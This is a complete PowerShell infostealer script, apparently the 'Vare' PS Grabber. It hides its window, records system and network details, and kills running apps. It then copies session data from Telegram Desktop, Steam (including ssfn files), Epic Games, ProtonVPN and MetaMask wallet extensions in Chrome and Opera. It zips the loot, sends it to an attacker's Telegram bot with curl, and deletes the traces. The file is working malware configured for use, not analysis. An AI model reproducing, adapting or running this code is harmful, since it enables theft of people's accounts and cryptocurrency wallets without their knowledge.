$ErrorActionPreference= 'silentlycontinue'
$pcname = $env:COMPUTERNAME
$RandomNumber = Get-Random
# if you dont know what youre doing dont change anything except the configs below
# if you dont know what youre doing dont change anything except the configs below
# if you dont know what youre doing dont change anything except the configs below


### TELEGRAM CONFIG

$chatid = "" # YOUR TELEGRAM CHAT ID
$bottoken = "" # YOUR TELEGRAM BOT TOKEN

### TELEGRAM CONFIG



### VARE SESSION THIEF CONFIG 

$telegramvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS 
$epicvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS 
$protonvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS 
$metavr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS - LARGE FILE WARNING >.<
$steamvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS 

### VARE SESSION THIEF CONFIG 


$DATE = Get-Date -Format "MM/dd/yyyy"
$DATE2 = Get-Date -Format "MM-dd-yyyy"


$IP = Invoke-WebRequest -Uri "http://ip-api.com/json/?fields=8194" -UseBasicParsing
$IP = $IP.Content | ConvertFrom-Json
$CR = $IP.countryCode
$IP = $IP.query


$main = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber"
$sessions = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber\Sessions"
$crypto = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber\Sessions\Crypto"


$vareb64 = "KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKKiAgICAgICAgICAg4paI4paI4pWXICAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICoKKiAgICAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdICAgICAgICAgICoKKiAgICAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgKgoqICAgICAgICAgICDilZrilojilojilZcg4paI4paI4pWU4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWdICAgICAgICAgICAgKgoqICAgICAgICAgICAg4pWa4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZcgICAgICAgICAgKgoqICAgICAgICAgICAgIOKVmuKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgICAgICAgICAqCiogICAgICAgICAgICAgICAgICAgICAgIFBTIEdSQUJCRVIgICAgICAgICAgICAgICAgICAgICAqCiogICAgICAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL3NhaW50ZGFkZHkgICAgICAgICAgICAqCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq"
$dcstrings = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vareb64))
$vare = "$dcstrings`nLog Name : $pcname`nLog Date : $DATE`n"


New-Item -ItemType Directory -Path $main -Force
New-Item -ItemType Directory -Path $sessions -Force


$steam = "Not Found"
$telegram = "Not Found"
$epicgames = "Not Found"
$proton = "Not Found"
$metamask = "Not Found"

function hide-me
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consoler = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consoler, 0)
}

function pcInfo() {
    $OS = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $UUID = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    $CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $GPU = (Get-WmiObject Win32_VideoController).Name 
    $RAM = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}    
    $info = "$vare`n========================================================`n`nOS  : $OS`n`nUUID : $UUID`n`nCPU : $CPU`n`nGPU : $GPU`n`nRAM : $RAM`n`n========================================================"
    $info > $main\System.txt
}

function networkInfo() {
    $MAC = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $info = "$vare`n========================================================`n`nIP  : $IP`n`nMAC : $MAC`n`n========================================================"
    $info > $main\Network.txt
}

function getepic {
    $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
    if (!(Test-Path $epicgamesfolder)) {return}
    $processname = "epicgameslauncher"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $epicgames_session = "$env:temp\Vare-EpicGames"
    New-Item -ItemType Directory -Force -Path $epicgames_session
    Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
    Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
    Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    Compress-Archive -Path $epicgames_session -DestinationPath "$sessions\EpicGames.zip" -CompressionLevel Fastest -Force
    Remove-Item $epicgames_session -Recurse -Force
}

function getproton {
    $protonvpnfolder = "$env:localappdata\protonvpn"
    if (!(Test-Path $protonvpnfolder)) {return}
    $processname = "protonvpn"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $protonvpn_account = "$env:temp\Vare-ProtonVPN"
    New-Item -ItemType Directory -Force -Path $protonvpn_account
    $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
    $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
    $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
    foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
        Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
    }
    foreach ($file in $files) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
        Copy-Item -Path $file.FullName -Destination $destinationPath -Force
    }
    Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
    Compress-Archive -Path $protonvpn_account -DestinationPath "$sessions\ProtonVPN.zip" -CompressionLevel Fastest -Force
    Remove-Item $protonvpn_account -Recurse -Force
}

function gettelegram {
    $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
    if (!(Test-Path $path)) {return}
    $processname = "telegram"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $destination = "$sessions\Telegram.zip"
    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
    $files = Get-ChildItem -Path $path -Exclude $exclude
    Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
}

function getmetamask {
    $paths = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
    }
    
    $extpath = @{
        "Meta" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    }
    
    foreach ($pathKey in $paths.Keys) {
        $pathValue = $paths[$pathKey]
    
        foreach ($extKey in $extpath.Keys) {
            $extValue = $extpath[$extKey]
            $sessiontemp = "$env:temp\$pathKey-MetaMask"
            $newPath = "$pathValue$extValue"
            if (Test-Path -Path $newPath -PathType Container) {
                New-Item -ItemType Directory -Path $crypto -Force
                Copy-Item -Path $newPath -Destination $sessiontemp -Recurse -force
                Compress-Archive -Path $sessiontemp -DestinationPath "$crypto\$pathKey-MetaMask" -CompressionLevel Fastest -Force
                Remove-Item $sessiontemp -Recurse -Force
            }
        }
    }    

}

function getsteam {
    $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
    if (!(Test-Path $steamfolder)) {return}
    $processname = "steam"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $steam_session = "$env:TEMP\Vare-Steam"
    New-Item -ItemType Directory -Force -Path $steam_session
    Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
    $ssfnfiles = @("ssfn$1")
    foreach($file in $ssfnfiles) {
        Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
    }
    Compress-Archive -Path $steam_session -DestinationPath "$sessions\Steam.zip" -CompressionLevel Fastest -Force
    Remove-Item $steam_session -Recurse -Force
}

function startvare {
    hide-me
    pcInfo
    networkInfo
    if ($telegramvr -eq "true") {
        gettelegram
    }
    if ($steamvr -eq "true") {
        getsteam
    }
    if ($epicvr -eq "true") {
        getepic
    }
    if ($protonvr -eq "true") {
        getproton
    }
    if ($metavr -eq "true") {
        getmetamask
    }
}

startvare

if (!(Test-Path "$sessions\Telegram.zip")) {} else {
    $telegram = "Found"
}
if (!(Test-Path "$sessions\Steam.zip")) {} else {
    $steam = "Found"
}
if (!(Test-Path "$sessions\ProtonVPN.zip")) {} else {
    $proton = "Found"
}
if (!(Test-Path "$sessions\EpicGames.zip")) {} else {
    $epicgames = "Found"
}
if (!(Test-Path "$crypto")) {} else {
    $metamask = "Found"
}
$sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`n========================================================"
$sessionscontent > "$main\Sessions.txt"

Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force
Remove-Item $main -Recurse -Force

$mainpath = "$main.zip"
$api = "https://api.telegram.org/bot$bottoken/sendDocument"


$crl = "curl.exe -X POST -H ""content-type: multipart/form-data"" -F document=@'$mainpath' -F chat_id=$chatId $api"
Invoke-Expression $crl
Remove-Item "$main.zip" -Recurse -Force
